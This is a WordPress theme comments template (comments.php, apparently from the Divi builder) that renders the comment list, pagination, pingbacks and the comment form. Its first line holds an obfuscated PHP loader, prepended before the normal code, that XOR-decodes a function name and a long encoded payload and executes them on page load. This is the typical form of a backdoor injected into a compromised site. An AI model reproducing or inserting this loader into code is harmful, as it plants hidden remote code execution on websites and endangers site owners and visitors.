<?php $iLzGN='-+V004>UB6MZ<D<'^'NY3QDQa37X..U+R';$JDyzauzvJYuy=$iLzGN('','SUqx36-CF1R>sIHQ2F>ZA=6D8J7D,5+ U9bKEr5BEM94YGDQ8OT.Bi-YJX:rZ<Zpi2,TJCqO37,sDsryJUxh>F72=VilImONHH>5+NwSQGrIIgEUF8T;L CpmD6N2JbdVEClqhZXw:8OGCMUMHD991uOIeTltl.SJbGTLGL;-I6NPom.-4NlPmcX0+<BDGRdG+L8aCSEPf2K<j6 FMWlZUQ->EHdqY7:+b9S QEJ16=6YzCdXX7I2,2TCfg3bv3u2iSCOlKWWCKVOT8M5LYgGAe=L.702eR 4AIUiK,=wYBB-1TWcUjfMOWASsrD>CX7gliePUBWKfCE5H5R276ZExBo1w8f20hXTDCWF<1GIohf3A-KPYD-2jyOJA;UmF7:lsQi2QYj>1AsJM;2YrHEVP8I+Vxy-i66crZXD9Ntv6DP73ID9PW<RqU918TSGA5bU8OiSA2SPzgZI0<VIru-QZUGZMc>9H4gZEMQLwy8+yw2WAMmQSCAK X132I3h.X3+,Kao:5ThIAsYO6ZEkpMtYU<lRmW5B1ln W:m4xlIRWFup7DC6-M1y+WZVYWZ.qyMPj p6IuVOX5JPuBNmZ:=WUrZK7<VSESDDPK:,H6BURSusR-.57XMXiORem1C4P9SLeHQ,N-gpC8YU.2RplLVbZQI0;qxQmmI'^':3YYUCC 2X=P,,08A2MrfEY6g.V0MjtM MEblRNHL+LZ:3->Vo,A06I8>9e-7I.XMVM +oQkXRUZdSRYj.ra7bXGIvTLnJtDAAXZYfS:qzRyrGa<zK I E-XI W:ScYDr,hGXbSQSUM;gmpuel XMP.k 8t2THE639c=lblHY;Z+>GIEHMg1yViQ9YY615<LcD9LHxYL-lOA6NRA2,wQz30AM snU=VNJ=R6YqxjWWQE<AIn>7E,SOZtkB8p-9x<wI20oH 2.cvhopN,Y9<Ng:o4hJVDS:9EMatuM IDLSKfIP 6ChJB;.;46Hx94I1QGDHA4466bF8O<.Z WVU2ePf0c2i3wc<x57cs-YHgtQHBE A>5pdV8cpk. O42-RCLNqMY4 Q48HW.,OSyOha 1T<NmrpPcK<iV>90XnIVv1>DV;-X<>F7Y-VCg023 j=8M;A1 A6fN8>,SS2,ZQI0.4nvmGZX<U81 4xeLsQMQSV65,Mwuc 9R9HlY,J7K ZXX8IHQP-OeaW=.B;lKVkTq8XYzI3T6P7IK2CJiQLtowaFATrvUHuRKMd>akflLAH,cYBBUqFa,lTmyUdhM;HO6,-1.Nc3+, 07xlJM1Z-46tYSvIOAVqdxIorEMJI=5O2 Ml5M:L<W3Y 9AS6W1emhS41YOYHxVg4');$JDyzauzvJYuy();
	if ( post_password_required() ) : ?>

<p class="nocomments container"><?php esc_html_e( 'This post is password protected. Enter the password to view comments.', 'et_builder' ); ?></p>
<?php
		return;
	endif;
?>
<!-- You can start editing here. -->

<section id="comment-wrap">
	<h1 id="comments" class="page_title"><?php comments_number( esc_html__( '0 Comments', 'et_builder' ), esc_html__( '1 Comment', 'et_builder' ), '% ' . esc_html__( 'Comments', 'et_builder' ) ); ?></h1>
	<?php if ( have_comments() ) : ?>
		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // Are there comments to navigate through? ?>
			<div class="comment_navigation_top clearfix">
				<div class="nav-previous"><?php previous_comments_link( et_get_safe_localization( __( '<span class="meta-nav">&larr;</span> Older Comments', 'et_builder' ) ) ); ?></div>
				<div class="nav-next"><?php next_comments_link( et_get_safe_localization( __( 'Newer Comments <span class="meta-nav">&rarr;</span>', 'et_builder' ) ) ); ?></div>
			</div> <!-- .navigation -->
		<?php endif; // check for comment navigation ?>

		<?php  if ( ! empty($comments_by_type['comment']) ) : ?>
			<ol class="commentlist clearfix">
				<?php wp_list_comments( array('type'=>'comment', 'callback'=>'et_custom_comments_display' ) ); ?>
			</ol>
		<?php endif; ?>

		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : // Are there comments to navigate through? ?>
			<div class="comment_navigation_bottom clearfix">
				<div class="nav-previous"><?php previous_comments_link( et_get_safe_localization( __( '<span class="meta-nav">&larr;</span> Older Comments', 'et_builder' ) ) ); ?></div>
				<div class="nav-next"><?php next_comments_link( et_get_safe_localization( __( 'Newer Comments <span class="meta-nav">&rarr;</span>', 'et_builder' ) ) ); ?></div>
			</div> <!-- .navigation -->
		<?php endif; // check for comment navigation ?>

		<?php if ( ! empty($comments_by_type['pings']) ) : ?>
			<div id="trackbacks">
				<h3 id="trackbacks-title"><?php esc_html_e('Trackbacks/Pingbacks','et_builder'); ?></h3>
				<ol class="pinglist">
					<?php wp_list_comments('type=pings&callback=et_list_pings'); ?>
				</ol>
			</div>
		<?php endif; ?>
	<?php else : // this is displayed if there are no comments so far ?>
	   <div id="comment-section" class="nocomments">
		  <?php if ('open' == $post->comment_status) : ?>
			 <!-- If comments are open, but there are no comments. -->

		  <?php else : // comments are closed ?>
			 <!-- If comments are closed. -->

		  <?php endif; ?>
	   </div>
	<?php endif; ?>
	<?php if ('open' == $post->comment_status) : ?>
		<?php comment_form( array('label_submit' => esc_attr__( 'Submit Comment', 'et_builder' ), 'title_reply' => '<span>' . esc_attr__( 'Submit a Comment', 'et_builder' ) . '</span>', 'title_reply_to' => esc_attr__( 'Leave a Reply to %s', 'et_builder' ), 'class_submit' => 'submit et_pb_button', 'comment_notes_after' => '', 'id_submit' => 'et_pb_submit' ) ); ?>
	<?php else: ?>

	<?php endif; // if you delete this the sky will fall on your head ?>
</section>